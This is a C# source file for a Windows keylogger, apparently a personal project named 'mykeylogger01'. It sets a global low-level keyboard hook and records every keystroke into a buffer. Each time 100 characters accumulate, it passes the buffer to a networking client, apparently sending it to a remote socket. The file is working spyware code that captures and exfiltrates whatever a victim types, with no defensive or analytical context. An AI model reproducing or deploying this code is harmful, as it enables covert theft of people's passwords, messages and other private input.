using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using Networking;

namespace mykeylogger01
{
    class Program
    {
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 100;
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                try {
                Client client = new Client();
                client.clientSocket(buffer);
                }
                catch(Exception e) {
                    Console.WriteLine(e);
                }
                buffer = "";
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }
            
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
